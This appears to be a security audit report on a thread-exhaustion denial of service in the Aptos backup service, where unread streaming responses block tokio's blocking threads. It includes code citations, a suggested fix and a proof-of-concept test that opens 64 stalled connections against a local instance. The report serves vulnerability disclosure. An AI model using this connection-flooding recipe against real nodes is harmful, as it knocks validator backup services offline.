# Audit Report

## Title
Backup Service Thread Exhaustion via Unpolled Stream Blocking Attack

## Summary
The backup service's `BytesSender` implementation uses `blocking_send()` to transmit data through a bounded channel. When HTTP clients open connections to streaming endpoints but never read the response body, the receiver stream remains unpolled, causing the channel to fill up and the sender to block indefinitely. This exhausts the tokio blocking thread pool (limited to 64 threads), causing a Denial of Service for the backup service and potentially other node operations.

## Finding Description

The vulnerability exists in the interaction between three components:

1. **BytesSender channel creation** [1](#0-0) 

2. **Blocking send operation** [2](#0-1) 

3. **Spawn blocking task pattern** [3](#0-2) 

The attack flow works as follows:

**Step 1:** Attacker sends HTTP GET requests to streaming endpoints such as `/state_snapshot/{version}`, `/transactions/{start}/{count}`, or `/epoch_ending_ledger_infos/{start}/{end}` [4](#0-3) 

**Step 2:** The handler calls `reply_with_bytes_sender()` which creates a tokio mpsc channel with capacity `MAX_BATCHES = 100` and spawns a blocking task using `tokio::task::spawn_blocking()`.

**Step 3:** The blocking task begins iterating over database records and calling `send_size_prefixed_bcs_bytes()` for each record. After buffering data (10KB threshold in production), it calls `flush_buffer()` which invokes `send_res()`.

**Step 4:** The `send_res()` function uses `self.bytes_tx.blocking_send(item)`, which is a **blocking operation** that will block the current thread indefinitely if the channel is full.

**Step 5:** If the HTTP client stops reading the response body (but keeps the connection open), the `ReceiverStream` wrapped in the HTTP response body is never polled. This means the channel receiver never consumes any items.

**Step 6:** After 100 batches (approximately 1MB of data) are sent to the channel, the channel reaches capacity. The next call to `blocking_send()` blocks the thread indefinitely, waiting for space that will never become available.

**Step 7:** The tokio blocking thread pool is limited to 64 threads [5](#0-4) 

**Step 8:** An attacker opening 64 concurrent connections to streaming endpoints without reading responses will exhaust all blocking threads, causing complete backup service unavailability and potentially affecting other services that use the same blocking thread pool.

This vulnerability breaks the **Resource Limits** invariant (#9): "All operations must respect gas, storage, and computational limits." The blocking threads represent a critical finite resource that is not properly protected.

## Impact Explanation

This is a **High Severity** vulnerability according to Aptos bug bounty criteria:

- **Validator node slowdowns**: The backup service becomes completely unavailable when all blocking threads are exhausted. This prevents operators from performing backups, which is critical for disaster recovery.

- **Resource exhaustion**: The blocking thread pool is shared across the node. Exhausting it can impact other node operations that rely on `spawn_blocking()`, potentially causing cascading performance degradation.

- **Easy exploitation**: The attack requires no authentication or special privileges - just the ability to send HTTP requests to the backup service endpoint. The attacker doesn't need to consume significant bandwidth or computational resources.

- **No automatic recovery**: Blocked threads remain stuck indefinitely until connections are forcibly closed or the process is restarted. There is no timeout mechanism to detect and recover from this condition.

The issue does not reach Critical severity because it doesn't directly affect consensus, cause fund loss, or compromise validator keys. However, it significantly degrades node availability and operational capability.

## Likelihood Explanation

This vulnerability is **highly likely** to be exploitable:

- **No authentication required**: If the backup service endpoint is accessible (commonly exposed for backup operations), any network client can exploit it.

- **Minimal attacker resources**: Only 64 concurrent connections are needed to exhaust the thread pool. Each connection consumes minimal bandwidth (only needs to send initial HTTP request and receive headers).

- **No rate limiting observed**: The code shows no connection rate limiting or per-client connection limits.

- **Reliable exploitation**: The attack is deterministic - once the channel fills up, `blocking_send()` will reliably block the thread.

- **Multiple vulnerable endpoints**: Four different streaming endpoints can be exploited: `state_snapshot`, `state_snapshot_chunk`, `epoch_ending_ledger_infos`, and `transactions`.

## Recommendation

Implement multiple defense layers:

**1. Replace blocking_send with timeout-based sending:**

```rust
pub fn send_res(&self, item: BytesResult) -> DbResult<()> {
    // Use try_send with retries and timeout instead of blocking_send
    const MAX_RETRIES: usize = 10;
    const RETRY_DELAY_MS: u64 = 100;
    
    for _ in 0..MAX_RETRIES {
        match self.bytes_tx.try_send(item.clone()) {
            Ok(_) => return Ok(()),
            Err(tokio::sync::mpsc::error::TrySendError::Full(_)) => {
                std::thread::sleep(std::time::Duration::from_millis(RETRY_DELAY_MS));
                continue;
            }
            Err(e) => {
                return Err(AptosDbError::Other(format!(
                    "Failed to send to response stream. {e}"
                )))
            }
        }
    }
    
    Err(AptosDbError::Other(
        "Timeout sending to response stream - receiver not consuming data".into()
    ))
}
```

**2. Add connection timeout and monitoring:**

Implement server-side timeouts in the warp server configuration to detect and close stalled connections.

**3. Add per-client connection limits:**

Track active connections per client IP and reject new connections that would exceed a reasonable limit.

**4. Use async channels with proper backpressure:**

Consider refactoring to use async/await instead of `spawn_blocking`, allowing proper cooperative task cancellation when streams are dropped.

## Proof of Concept

```rust
#[cfg(test)]
mod exploit_test {
    use super::*;
    use aptos_config::utils::get_available_port;
    use aptos_temppath::TempPath;
    use std::net::{IpAddr, Ipv4Addr, SocketAddr};
    use std::sync::Arc;
    use std::time::Duration;
    
    #[test]
    fn test_backup_service_thread_exhaustion() {
        // Setup test database
        let tmpdir = TempPath::new();
        let db = Arc::new(AptosDB::new_for_test(&tmpdir));
        
        // Start backup service
        let port = get_available_port();
        let addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), port);
        let _rt = start_backup_service(addr, db);
        
        // Give server time to start
        std::thread::sleep(Duration::from_millis(100));
        
        // Exploit: Open multiple connections without reading responses
        let num_attack_connections = 64;
        let mut handles = vec![];
        
        for i in 0..num_attack_connections {
            let handle = std::thread::spawn(move || {
                // Open connection and send request
                let client = reqwest::blocking::Client::builder()
                    .timeout(Duration::from_secs(300))
                    .build()
                    .unwrap();
                    
                // Request a streaming endpoint but don't read the body
                let response = client
                    .get(format!("http://127.0.0.1:{}/state_snapshot/0", port))
                    .send()
                    .unwrap();
                
                println!("Attack connection {} established, status: {}", i, response.status());
                
                // Keep connection open but don't read body
                // This prevents the stream from being polled
                std::thread::sleep(Duration::from_secs(60));
            });
            handles.push(handle);
            
            // Small delay between connections
            std::thread::sleep(Duration::from_millis(50));
        }
        
        // After spawning attack connections, try to make a legitimate request
        std::thread::sleep(Duration::from_secs(2));
        
        // This should fail or timeout because all blocking threads are exhausted
        let result = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(5))
            .build()
            .unwrap()
            .get(format!("http://127.0.0.1:{}/state_snapshot/0", port))
            .send();
            
        // Legitimate request should fail due to resource exhaustion
        assert!(
            result.is_err() || result.unwrap().status().is_server_error(),
            "Backup service should be unavailable after thread pool exhaustion"
        );
        
        // Cleanup
        for handle in handles {
            let _ = handle.join();
        }
    }
}
```

## Notes

The vulnerability is particularly concerning because:

1. The backup service is typically exposed to allow external backup operations, making it accessible to potential attackers.

2. The comment in `aptos-runtimes/src/lib.rs` explicitly acknowledges the risk: "Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many Rest API calls overwhelm the node" - but this limit (64) is still small enough to exhaust with a focused attack.

3. There is no server-side timeout mechanism to detect connections where the client has stopped reading, allowing the attack to persist indefinitely.

4. The issue affects all four streaming endpoints in the backup service, providing multiple attack vectors.

### Citations

**File:** storage/backup/backup-service/src/handlers/bytes_sender.rs (L28-42)
```rust
    pub fn new(
        endpoint: &'static str,
    ) -> (Self, tokio_stream::wrappers::ReceiverStream<BytesResult>) {
        let (bytes_tx, bytes_rx) = tokio::sync::mpsc::channel(Self::MAX_BATCHES);

        let myself = Self {
            buffer: BytesMut::new(),
            bytes_tx,
            endpoint,
        };

        let stream = tokio_stream::wrappers::ReceiverStream::new(bytes_rx);

        (myself, stream)
    }
```

**File:** storage/backup/backup-service/src/handlers/bytes_sender.rs (L83-87)
```rust
    pub fn send_res(&self, item: BytesResult) -> DbResult<()> {
        self.bytes_tx
            .blocking_send(item)
            .map_err(|e| AptosDbError::Other(format!("Failed to send to response stream. {e}")))
    }
```

**File:** storage/backup/backup-service/src/handlers/utils.rs (L46-65)
```rust
pub(super) fn reply_with_bytes_sender<F>(
    backup_handler: &BackupHandler,
    endpoint: &'static str,
    f: F,
) -> Box<dyn Reply>
where
    F: FnOnce(BackupHandler, &mut bytes_sender::BytesSender) -> DbResult<()> + Send + 'static,
{
    let (sender, stream) = bytes_sender::BytesSender::new(endpoint);

    // spawn and forget, error propagates through the `stream: TryStream<_>`
    let bh = backup_handler.clone();
    let _join_handle = tokio::task::spawn_blocking(move || {
        let _timer =
            BACKUP_TIMER.timer_with(&[&format!("backup_service_bytes_sender_{}", endpoint)]);
        abort_on_error(f)(bh, sender)
    });

    Box::new(Response::new(Body::wrap_stream(stream)))
}
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L49-110)
```rust
    let state_snapshot = warp::path!(Version)
        .map(move |version| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT, move |bh, sender| {
                bh.get_state_item_iter(version, 0, usize::MAX)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_item_count/<version>
    let bh = backup_handler.clone();
    let state_item_count = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(
                STATE_ITEM_COUNT,
                &(bh.get_state_item_count(version)? as u64),
            )
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET state_snapshot_chunk/<version>/<start_idx>/<limit>
    let bh = backup_handler.clone();
    let state_snapshot_chunk = warp::path!(Version / usize / usize)
        .map(move |version, start_idx, limit| {
            reply_with_bytes_sender(&bh, STATE_SNAPSHOT_CHUNK, move |bh, sender| {
                bh.get_state_item_iter(version, start_idx, limit)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET state_root_proof/<version>
    let bh = backup_handler.clone();
    let state_root_proof = warp::path!(Version)
        .map(move |version| {
            reply_with_bcs_bytes(STATE_ROOT_PROOF, &bh.get_state_root_proof(version)?)
        })
        .map(unwrap_or_500)
        .recover(handle_rejection);

    // GET epoch_ending_ledger_infos/<start_epoch>/<end_epoch>/
    let bh = backup_handler.clone();
    let epoch_ending_ledger_infos = warp::path!(u64 / u64)
        .map(move |start_epoch, end_epoch| {
            reply_with_bytes_sender(&bh, EPOCH_ENDING_LEDGER_INFOS, move |bh, sender| {
                bh.get_epoch_ending_ledger_info_iter(start_epoch, end_epoch)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);

    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```
